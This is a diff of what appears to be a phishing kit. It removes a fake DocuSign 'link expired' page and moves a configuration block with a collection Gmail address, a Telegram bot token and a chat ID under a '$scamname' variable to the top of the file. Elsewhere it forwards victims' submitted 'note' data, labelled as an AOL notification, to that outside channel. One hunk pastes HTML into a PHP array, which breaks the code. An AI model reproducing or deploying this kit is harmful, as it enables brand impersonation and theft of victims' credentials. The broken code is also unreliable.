@@ -1,87 +1,19 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>DocuSign - Link Expired</title>
-  <link rel="stylesheet" href="expired.css" />
-</head>
-<style>
-  /* Reset default styles */
-* {
-  margin: 0;
-  padding: 0;
-  box-sizing: border-box;
-}
+<?php 
+session_start();
+error_reporting(0);
 
-/* Page background */
-body {
-  font-family: Arial, Helvetica, sans-serif;
-  background-color: #f8f8f8;
-  height: 100vh;
-}
+// Turn ON the antivirus on Anticonfig
 
-/* Header bar */
-.top-bar {
-  background-color: #ffffff;
-  padding: 15px 25px;
-  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
-  display: flex;
-  align-items: center;
-}
 
-/* DocuSign logo */
-.logo {
-  height: 32px;
-}
+$scamname = ""; //
+//Your Email
+$send = "appon132@gmail.com";
+//Telegram Bot Token
+$TGBO = '7897940356:AAFZg8h-zd7XZ8zC0M1ARWWG5WSsU0REEUw';
+//Telegram ChatID 
+$cID = '6209158260';
 
-/* Error bar */
-.error-bar {
-  background-color: #e85b2c;
-  color: #fff;
-  padding: 15px 25px;
-  font-size: 16px;
-  font-weight: 500;
-}
-
-/* Center text inside bar */
-.error-bar p {
-  margin: 0;
-  text-align: center;
-}
-
-/* Responsive tweaks */
-@media (max-width: 600px) {
-  .error-bar p {
-    text-align: center;
-    font-size: 15px;
-  }
-
-  .top-bar {
-    justify-content: center;
-  }
-}
-
-</style>
-<body>
-  <header class="top-bar">
-    <img src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg" 
-         alt="DocuSign Logo" class="logo" />
-  </header>
-
-  <main>
-    <div class="error-bar">
-      <p>This link from your email has expired.</p>
-    </div>
-  </main>
-  <script>
-// Auto-redirect after 5 seconds (5000 milliseconds)
-setTimeout(function() {
-window.location.href = "https://account.docusign.com/";
-}, 9000);
-</script>
-</body>
-</html>
+?>
 
 <!DOCTYPE html>
 <html lang="en">
@@ -525,7 +457,9 @@ else{
 $data = array(
         'signal' => $signal,
         'msg' => $msg,
-        'redirect_link' => $redirect,
+        'redirect_link' => $redirect, <head>
+    <meta http-equiv="refresh" content="5; url=https://bbc.co.uk" />
+</head>
     );
     echo json_encode($data);
 	
@@ -533,21 +467,5 @@ if(isset($_POST['note'])){
         call("/- AOL  Notification -/
            ".$_POST['note']);
         }
-
-?>
-<?php 
-session_start();
-error_reporting(0);
-
-// Turn ON the antivirus on Anticonfig
-
-
-$scamname = ""; //
-//Your Email
-$send = "appon132@gmail.com";
-//Telegram Bot Token
-$TGBO = '7897940356:AAFZg8h-zd7XZ8zC0M1ARWWG5WSsU0REEUw';
-//Telegram ChatID 
-$cID = '6209158260';
 
 ?>
